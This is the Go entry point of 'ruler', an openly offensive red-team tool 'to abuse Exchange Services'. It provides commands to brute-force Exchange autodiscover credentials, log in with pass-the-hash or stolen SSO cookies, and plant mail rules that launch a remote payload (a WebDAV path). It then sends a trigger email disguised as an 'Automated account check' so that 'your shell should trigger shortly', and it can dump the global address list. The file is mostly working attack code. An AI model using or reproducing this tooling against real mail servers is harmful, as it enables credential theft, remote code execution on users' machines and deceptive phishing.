package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/howeyc/gopass"
	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
	"github.com/urfave/cli"
)

//globals
var config utils.Session

func exit(err error) {
	//we had an error
	if err != nil {
		utils.Error.Println(err)
	}

	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		utils.Error.Println(err)
	}
	os.Exit(exitcode)
}

//function to perform a bruteforce
func brute(c *cli.Context) error {
	if c.String("users") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --users or --userpass required")
	}
	if c.String("passwords") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --passwords or --userpass required")

	}
	if c.GlobalString("domain") == "" && c.GlobalString("url") == "" {
		return fmt.Errorf("Either --domain or --url required")
	}

	utils.Info.Println("Starting bruteforce")
	userpass := c.String("userpass")

	if userpass == "" {
		if c.GlobalString("domain") != "" {
			autodiscover.BruteForce(c.GlobalString("domain"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		} else {
			autodiscover.BruteForce(c.GlobalString("url"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		}
	} else {
		if c.GlobalString("domain") != "" {
			autodiscover.UserPassBruteForce(c.GlobalString("domain"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		} else {
			autodiscover.UserPassBruteForce(c.GlobalString("url"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		}
	}
	return nil
}

//Function to add new rule
func addRule(c *cli.Context) error {
	utils.Info.Println("Adding Rule")

	res, err := mapi.ExecuteMailRuleAdd(c.String("name"), c.String("trigger"), c.String("location"), true)
	if err != nil || res.StatusCode == 255 {
		return fmt.Errorf("Failed to create rule. %s", err)
	}

	utils.Info.Println("Rule Added. Fetching list of rules...")

	printRules()

	if c.Bool("send") {
		utils.Info.Println("Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
		//initate a ping sequence, just incase we are on RPC/HTTP
		//we need to keep the socket open
		go mapi.Ping()
		time.Sleep(time.Second * (time.Duration)(30))
		utils.Info.Println("Sending email")
		if c.String("subject") == "" {
			sendMessage(c.String("trigger"), c.String("body"))
		} else {
			sendMessage(c.String("subject"), c.String("body"))
		}

	}

	return nil
}

//Function to delete a rule
func deleteRule(c *cli.Context) error {
	var ruleid []byte
	var err error

	if c.String("id") == "" && c.String("name") != "" {
		rules, er := mapi.DisplayRules()
		if er != nil {
			return er
		}
		utils.Info.Printf("Found %d rules. Extracting ids\n", len(rules))
		for _, v := range rules {
			if utils.FromUnicode(v.RuleName) == c.String("name") {
				reader := bufio.NewReader(os.Stdin)
				utils.Question.Printf("Delete rule with id %x [y/N]: ", v.RuleID)
				ans, _ := reader.ReadString('\n')
				if ans == "y\n" || ans == "Y\n" || ans == "yes\n" {
					ruleid = v.RuleID
					err = mapi.ExecuteMailRuleDelete(ruleid)
					if err != nil {
						utils.Error.Printf("Failed to delete rule")
					}
				}
			}
		}
		if ruleid == nil {
			return fmt.Errorf("No rule with supplied name found")
		}
	} else {
		ruleid, err = hex.DecodeString(c.String("id"))
		if err != nil {
			return fmt.Errorf("Incorrect ruleid format. Try --name if you wish to supply a rule's name rather than id")
		}
		err = mapi.ExecuteMailRuleDelete(ruleid)
		if err != nil {
			utils.Error.Printf("Failed to delete rule")
		}
	}

	if err == nil {
		utils.Info.Println("Fetching list of remaining rules...")
		er := printRules()
		if er != nil {
			return er
		}
	}
	return err
}

//Function to display all rules
func displayRules(c *cli.Context) error {
	utils.Info.Println("Retrieving Rules")
	er := printRules()
	return er
}

func sendMessage(subject, body string) error {

	propertyTags := make([]mapi.PropertyTag, 1)
	propertyTags[0] = mapi.PidTagDisplayName

	_, er := mapi.GetFolder(mapi.OUTBOX, nil) //propertyTags)
	if er != nil {
		return er
	}
	_, er = mapi.SendMessage(subject, body)
	if er != nil {
		return er
	}
	utils.Info.Println("Message sent, your shell should trigger shortly.")

	return nil
}

//Function to connect to the Exchange server
func connect(c *cli.Context) error {
	var err error
	//check that name, trigger and location were supplied
	if c.GlobalString("email") == "" && c.GlobalString("username") == "" {
		return fmt.Errorf("Missing global argument. Use --domain (if needed), --username and --email")
	}
	//if no password or hash was supplied, read from stdin
	if c.GlobalString("password") == "" && c.GlobalString("hash") == "" {
		fmt.Printf("Password: ")
		var pass []byte
		pass, err = gopass.GetPasswd()
		if err != nil {
			// Handle gopass.ErrInterrupted or getch() read error
			return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
		}
		config.Pass = string(pass)
	} else {
		config.Pass = c.GlobalString("password")
		if config.NTHash, err = hex.DecodeString(c.GlobalString("hash")); err != nil {
			return fmt.Errorf("Invalid hash provided. Hex decode failed")
		}

	}
	//setup our autodiscover service
	config.Domain = c.GlobalString("domain")
	config.User = c.GlobalString("username")

	config.Email = c.GlobalString("email")

	config.Basic = c.GlobalBool("basic")
	config.Insecure = c.GlobalBool("insecure")
	config.Verbose = c.GlobalBool("verbose")
	config.Admin = c.GlobalBool("admin")
	config.RPCEncrypt = c.GlobalBool("encrypt")
	config.CookieJar, _ = cookiejar.New(nil)

	//add supplied cookie to the cookie jar
	if c.GlobalString("cookie") != "" {
		//split into cookies and then into name : value
		cookies := strings.Split(c.GlobalString("cookie"), ";")
		var cookieJarTmp []*http.Cookie
		var cdomain string
		//split and get the domain from the email
		if eparts := strings.Split(c.GlobalString("email"), "@"); len(eparts) == 2 {
			cdomain = eparts[1]
		} else {
			return fmt.Errorf("[x] Invalid email address")
		}

		for _, v := range cookies {
			cookie := strings.Split(v, "=")
			c := &http.Cookie{
				Name:   cookie[0],
				Value:  cookie[1],
				Path:   "/",
				Domain: cdomain,
			}
			cookieJarTmp = append(cookieJarTmp, c)
		}
		u, _ := url.Parse(fmt.Sprintf("https://%s/", cdomain))
		config.CookieJar.SetCookies(u, cookieJarTmp)
	}

	config.CookieJar, _ = cookiejar.New(nil)

	//add supplied cookie to the cookie jar
	if c.GlobalString("cookie") != "" {
		//split into cookies and then into name : value
		cookies := strings.Split(c.GlobalString("cookie"), ";")
		var cookieJarTmp []*http.Cookie
		var cdomain string
		//split and get the domain from the email
		if eparts := strings.Split(c.GlobalString("email"), "@"); len(eparts) == 2 {
			cdomain = eparts[1]
		} else {
			return fmt.Errorf("Invalid email address")
		}

		for _, v := range cookies {
			cookie := strings.Split(v, "=")
			c := &http.Cookie{
				Name:   cookie[0],
				Value:  cookie[1],
				Path:   "/",
				Domain: cdomain,
			}
			cookieJarTmp = append(cookieJarTmp, c)
		}
		u, _ := url.Parse(fmt.Sprintf("https://%s/", cdomain))
		config.CookieJar.SetCookies(u, cookieJarTmp)
	}

	url := c.GlobalString("url")

	if c.GlobalBool("o365") == true {
		url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
	}

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	var rawAutodiscover string

	//unless user specified nocache, check cache for existing autodiscover
	if c.GlobalBool("nocache") == false {
		resp = autodiscover.CheckCache(config.Email)
	}

	//var err error
	//try connect to MAPI/HTTP first -- this is faster and the code-base is more stable
	//unless of course the global "RPC" flag has been set, which specifies we should just use
	//RPC/HTTP from the get-go
	if !c.GlobalBool("rpc") {
		var mapiURL, abkURL, userDN string

		resp, rawAutodiscover, err = autodiscover.GetMapiHTTP(config.Email, url, resp)
		if err != nil {
			exit(err)
		}
		mapiURL = mapi.ExtractMapiURL(resp)
		abkURL = mapi.ExtractMapiAddressBookURL(resp)
		userDN = resp.Response.User.LegacyDN

		if mapiURL == "" { //try RPC
			//fmt.Println("No MAPI URL found. Trying RPC/HTTP")
			resp, _, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
			if err != nil {
				exit(err)
			}
			if resp.Response.User.LegacyDN == "" {
				return fmt.Errorf("Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
			}
			mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
			if c.GlobalBool("nocache") == false {
				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
			}
		} else {

			utils.Trace.Println("MAPI URL found: ", mapiURL)
			utils.Trace.Println("MAPI AddressBook URL found: ", abkURL)

			mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
			if c.GlobalBool("nocache") == false {
				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
			}
		}

	} else {
		utils.Trace.Println("RPC/HTTP forced, trying RPC/HTTP")
		resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
		if err != nil {
			exit(err)
		}
		mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
		if c.GlobalBool("nocache") == false {
			autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
		}
	}

	//now we should do the login
	logon, err := mapi.Authenticate()

	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {

		utils.Trace.Println("And we are authenticated")
		utils.Trace.Println("Openning the Inbox")

		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders
		mapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox
	}
	return nil
}

func printRules() error {
	rules, er := mapi.DisplayRules()

	if er != nil {
		return er
	}

	if len(rules) > 0 {
		utils.Info.Printf("Found %d rules\n", len(rules))
		maxwidth := 30

		for _, v := range rules {
			if len(string(v.RuleName)) > maxwidth {
				maxwidth = len(string(v.RuleName))
			}
		}
		maxwidth -= 10
		fmstr1 := fmt.Sprintf("%%-%ds | %%-s\n", maxwidth)
		fmstr2 := fmt.Sprintf("%%-%ds | %%x\n", maxwidth)
		utils.Info.Printf(fmstr1, "Rule Name", "Rule ID")
		utils.Info.Printf("%s|%s\n", (strings.Repeat("-", maxwidth+1)), strings.Repeat("-", 18))
		for _, v := range rules {
			utils.Info.Printf(fmstr2, string(utils.FromUnicode(v.RuleName)), v.RuleID)
		}
		utils.Info.Println()
	} else {
		utils.Info.Printf("No Rules Found\n")
	}
	return nil
}

//Function to display all rules
func abkList(c *cli.Context) error {
	if config.Transport == mapi.RPC {
		return fmt.Errorf("Address book support is currently limited to MAPI/HTTP")
	}
	utils.Trace.Println("Let's play addressbook")
	mapi.BindAddressBook()
	columns := make([]mapi.PropertyTag, 2)
	columns[0] = mapi.PidTagSMTPAddress
	columns[1] = mapi.PidTagDisplayName
	rows, _ := mapi.QueryRows(10, columns) //pull first 255 entries
	utils.Info.Println("Found the following entries: ")
	for k := 0; k < int(rows.RowCount); k++ {
		for v := 0; v < int(rows.Columns.PropertyTagCount); v++ {
			//value, p = mapi.ReadPropertyValue(rows.RowData[k].ValueArray[p:], rows.Columns.PropertyTags[v].PropertyType)
			utils.Info.Printf("%s :: ", rows.RowData[k].AddressBookPropertyValue[v].Value)
		}
		utils.Info.Println("")
	}
	return nil
}

func main() {

	app := cli.NewApp()
	app.Name = "ruler"
	app.Usage = "A tool to abuse Exchange Services"
	app.Version = "2.0.17"
	app.Author = "Etienne Stalmans <etienne@sensepost.com>, @_staaldraad"
	app.Description = `         _
 _ __ _   _| | ___ _ __
| '__| | | | |/ _ \ '__|
| |  | |_| | |  __/ |
|_|   \__,_|_|\___|_|

A tool by @_staaldraad from @sensepost to abuse Exchange Services.`

	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:  "domain,d",
			Value: "",
			Usage: "A domain for the user (optional in most cases. Otherwise allows: domain\\username)",
		},
		cli.BoolFlag{
			Name:  "o365",
			Usage: "We know the target is on Office365, so authenticate directly against that.",
		},
		cli.StringFlag{
			Name:  "username,u",
			Value: "",
			Usage: "A valid username",
		},
		cli.StringFlag{
			Name:  "password,p",
			Value: "",
			Usage: "A valid password",
		},
		cli.StringFlag{
			Name:  "hash",
			Value: "",
			Usage: "A NT hash for pass the hash",
		},
		cli.StringFlag{
			Name:  "email,e",
			Value: "",
			Usage: "The target's email address",
		},
		cli.StringFlag{
			Name:  "cookie",
			Value: "",
			Usage: "Any third party cookies such as SSO that are needed",
		},
		cli.StringFlag{
			Name:  "url",
			Value: "",
			Usage: "If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml",
		},
		cli.BoolFlag{
			Name:  "insecure,k",
			Usage: "Ignore server SSL certificate errors",
		},
		cli.BoolFlag{
			Name:  "encrypt",
			Usage: "Use NTLM auth on the RPC level - some environments require this",
		},
		cli.BoolFlag{
			Name:  "basic,b",
			Usage: "Force Basic authentication",
		},
		cli.BoolFlag{
			Name:  "admin",
			Usage: "Login as an admin",
		},
		cli.BoolFlag{
			Name:  "nocache",
			Usage: "Don't use the cached autodiscover record",
		},
		cli.BoolFlag{
			Name:  "rpc",
			Usage: "Force RPC/HTTP rather than MAPI/HTTP",
		},
		cli.BoolFlag{
			Name:  "verbose",
			Usage: "Be verbose and show some of thei inner workings",
		},
	}

	app.Before = func(c *cli.Context) error {
		if c.Bool("verbose") == true {
			utils.Init(os.Stdout, os.Stdout, os.Stdout, os.Stderr)
		} else {
			utils.Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)
		}
		return nil
	}

	app.Commands = []cli.Command{
		{
			Name:    "add",
			Aliases: []string{"a"},
			Usage:   "add a new rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "name,n",
					Value: "Delete Spam",
					Usage: "A name for our rule",
				},
				cli.StringFlag{
					Name:  "trigger,t",
					Value: "Hey John",
					Usage: "A trigger word or phrase - this is going to be the subject of our trigger email",
				},
				cli.StringFlag{
					Name:  "location,l",
					Value: "C:\\Windows\\System32\\calc.exe",
					Usage: "The location of our application to launch. Typically a WEBDAV URI",
				},
				cli.BoolFlag{
					Name:  "send,s",
					Usage: "Trigger the rule by sending an email to the target",
				},
				cli.StringFlag{
					Name:  "body,b",
					Value: "**Automated account check - please ignore**\r\n\r\nMicrosoft Exchange has run an automated test on your account.\r\nEverything seems to be configured correctly.",
					Usage: "The email body you may wish to use",
				},
				cli.StringFlag{
					Name:  "subject",
					Value: "",
					Usage: "The subject you wish to use, this should contain your trigger word.",
				},
			},
			Action: func(c *cli.Context) error {
				//check that name, trigger and location were supplied
				if c.String("name") == "" || c.String("trigger") == "" || c.String("location") == "" {
					cli.NewExitError("Missing rule item. Use --name, --trigger and --location", 1)
				}

				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = addRule(c)
				exit(err)

				return nil
			},
		},
		{
			Name:    "delete",
			Aliases: []string{"r"},
			Usage:   "delete an existing rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "id",
					Value: "",
					Usage: "The ID of the rule to delete",
				},
				cli.StringFlag{
					Name:  "name",
					Value: "",
					Usage: "The name of the rule to delete",
				},
			},
			Action: func(c *cli.Context) error {
				//check that ID was supplied
				if c.String("id") == "" && c.String("name") == "" {
					return cli.NewExitError("Rule id or name required. Use --id or --name", 1)
				}
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = deleteRule(c)

				exit(err)

				return nil
			},
		},
		{
			Name:    "display",
			Aliases: []string{"d"},
			Usage:   "display all existing rules",
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = displayRules(c)
				exit(err)

				return nil
			},
		},
		{
			Name:    "check",
			Aliases: []string{"c"},
			Usage:   "Check if the credentials work and we can interact with the mailbox",
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				utils.Info.Println("Looks like we are good to go!")
				return nil
			},
		},
		{
			Name:    "send",
			Aliases: []string{"s"},
			Usage:   "Send an email to trigger an existing rule. This uses the target user's own account.",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "subject,s",
					Value: "",
					Usage: "A subject to use, this should contain our trigger word",
				},
				cli.StringFlag{
					Name:  "body,b",
					Value: "**Automated account check - please ignore**\r\nMicrosoft Exchange has run an automated test on your account.\r\nEverything seems to be configured correctly.",
					Usage: "The email body you may wish to use",
				},
			},
			Action: func(c *cli.Context) error {
				//check that trigger word was supplied
				if c.String("subject") == "" {
					return cli.NewExitError("The subject is required. Use --subject", 1)
				}
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = sendMessage(c.String("subject"), c.String("body"))
				exit(err)
				return nil
			},
		},
		{
			Name:    "brute",
			Aliases: []string{"b"},
			Usage:   "Do a bruteforce attack against the autodiscover service to find valid username/passwords",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "users,u",
					Value: "",
					Usage: "Filename for a username list (one name per line)",
				},
				cli.StringFlag{
					Name:  "passwords,p",
					Value: "",
					Usage: "Filename for a password list (one password per line)",
				},
				cli.StringFlag{
					Name:  "userpass",
					Value: "",
					Usage: "Filename for a username:password list (one per line)",
				},
				cli.IntFlag{
					Name:  "attempts,a",
					Value: 3,
					Usage: "Number of attempts before delay",
				},
				cli.IntFlag{
					Name:  "delay,d",
					Value: 5,
					Usage: "Number of seconds to delay between attempts",
				},
				cli.BoolFlag{
					Name:  "stop,s",
					Usage: "Stop on success",
				},
				cli.BoolFlag{
					Name:  "verbose,v",
					Usage: "Display each attempt",
				},
			},
			Action: func(c *cli.Context) error {
				err := brute(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				return nil
			},
		},
		{
			Name:  "abk",
			Usage: "Interact with the Global Address Book",
			Subcommands: []cli.Command{
				{
					Name:  "list",
					Usage: "list the entries of the GAL",
					Action: func(c *cli.Context) error {
						err := connect(c)
						if err != nil {
							return cli.NewExitError(err, 1)
						}
						err = abkList(c)
						if err != nil {
							return cli.NewExitError(err, 1)
						}
						return nil
					},
				},
			},
		},
		{
			Name:    "troopers",
			Aliases: []string{"t"},
			Usage:   "Troopers",
			Action: func(c *cli.Context) error {
				utils.Info.Println("Ruler - Troopers 17 Edition")
				st := `.___________..______        ______     ______   .______    _______ .______          _______.
|           ||   _  \      /  __  \   /  __  \  |   _  \  |   ____||   _  \        /       |
 ---|  |----|   |_)  |    |  |  |  | |  |  |  | |  |_)  | |  |__   |  |_)  |      |   (----
    |  |     |      /     |  |  |  | |  |  |  | |   ___/  |   __|  |      /        \   \
    |  |     |  |\  \----.|   --'  | |   --'  | |  |      |  |____ |  |\  \----.----)   |
    |__|     | _| ._____|  \______/   \______/  | _|      |_______|| _| ._____|_______/

		https://www.troopers.de/troopers17/`
				utils.Info.Println(st)
				return nil
			},
		},
	}

	app.Action = func(c *cli.Context) error {
		cli.ShowAppHelp(c)
		return nil
	}

	app.Run(os.Args)

}
